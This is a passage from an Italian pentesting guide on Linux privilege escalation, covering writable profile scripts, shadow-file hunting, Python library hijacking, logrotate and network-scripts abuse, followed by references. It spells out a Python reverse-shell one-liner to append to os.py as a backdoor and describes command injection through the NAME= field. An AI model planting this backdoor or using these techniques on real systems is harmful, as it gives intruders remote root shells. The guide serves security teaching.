Il file `/etc/profile` e i file all'interno di `/etc/profile.d/` sono **script eseguiti quando un utente avvia una nuova shell**. Pertanto, se puoi **scrivere o modificare uno di essi, puoi effettuare un'escalation dei privilegi**.
```bash
...
A seconda del sistema operativo, i file `/etc/passwd` e `/etc/shadow` potrebbero utilizzare un nome diverso oppure potrebbe esistere un backup. Pertanto, è consigliabile **trovarli tutti** e **verificare se è possibile leggerli** per controllare **se contengono hash**:
```bash
...
```
### Posizione insolita/File di proprietà
```bash
...
Inoltre, alcuni **audit log** configurati "male" (backdoor?) potrebbero consentirti di **registrare password** negli audit log, come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
...
Dovresti anche controllare i file che contengono la parola "**password**" nel **nome** o all'interno del **contenuto**, oltre a cercare IP ed email nei log o regex per gli hash.\
Non illustrerò qui come eseguire tutte queste operazioni, ma se ti interessa puoi controllare gli ultimi controlli eseguiti da [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).
...
Per **inserire una backdoor nella libreria**, aggiungi semplicemente alla fine della libreria os.py la seguente riga (modifica IP e PORTA):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation di logrotate

Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di log o sulle relative directory padre di ottenere potenzialmente privilegi elevati. Questo accade perché `logrotate`, spesso in esecuzione come **root**, può essere manipolato per eseguire file arbitrari, soprattutto in directory come _**/etc/bash_completion.d/**_. È importante verificare i permessi non solo in _/var/log_, ma anche in qualsiasi directory in cui venga applicata la rotazione dei log.
...
Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log di nginx)**; pertanto, ogni volta che scopri di poter modificare i log, verifica chi li gestisce e controlla se puoi ottenere un'escalation dei privilegi sostituendo i log con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento alla vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<whatever>` in _/etc/sysconfig/network-scripts_ **oppure** di **modificare** uno script esistente, allora il **sistema è compromesso**.<sup>[[20]](#references)</sup>

Gli script di rete, ad esempio _ifcg-eth0_, vengono utilizzati per le connessioni di rete. Hanno esattamente l'aspetto dei file .INI. Tuttavia, in Linux vengono \~caricati\~ da Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` presente in questi script di rete non viene gestito correttamente. Se nel nome è presente uno **spazio bianco/vuoto, il sistema prova a eseguire la parte successiva allo spazio bianco/vuoto**. Ciò significa che **tutto ciò che segue il primo spazio vuoto viene eseguito come root**.
...
### Escape da Shell con restrizioni
...
## Framework per il rooting di Android: abuso del canale manager

I framework per il rooting di Android effettuano comunemente hook su una syscall per esporre funzionalità privilegiate del kernel a un manager in userspace. Un'autenticazione debole del manager (ad esempio, controlli della signature basati sull'ordine degli FD o schemi di password inadeguati) può consentire a un'app locale di impersonare il manager ed effettuare una privilege escalation a root su dispositivi già sottoposti a rooting. Maggiori informazioni e dettagli sull'exploitation sono disponibili qui:
...
**Kernelpop:** Enumerare le vulnerabilità del kernel in Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
...
- [1] [0xdf – HTB Planning (Privilege escalation tramite Crontab UI, riutilizzo delle credenziali zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig contraffatto per il monitor eseguito da cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: bypass di Neighborhood Watch (hijack di sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
...
- [7] [Attacco e difesa: tecniche di Privilege Escalation su Linux del 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
...
- [10] [lpeworkshop – Procedura dettagliata degli esercizi di laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
...
- [13] [rtcrowley/linux-private-i: tool di enumerazione e Privilege Escalation per Linux](https://github.com/rtcrowley/linux-private-i)
...
- [17] [Eseguibili SUID e Privilege Escalation su Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
...
- [20] [Root su Redhat/CentOS tramite network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Cos'è systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (iniezione di aritmetica bash tramite i log, catena complessiva)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
...
- [26] [0xdf – HTB Slonik (copia cron di pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Lo nomini, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
...
- [29] [Rich Mirch – Vulnerabilità di Sudo di CVE-2025-32462 e CVE-2025-32463 per l'elevation-of-privilege](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
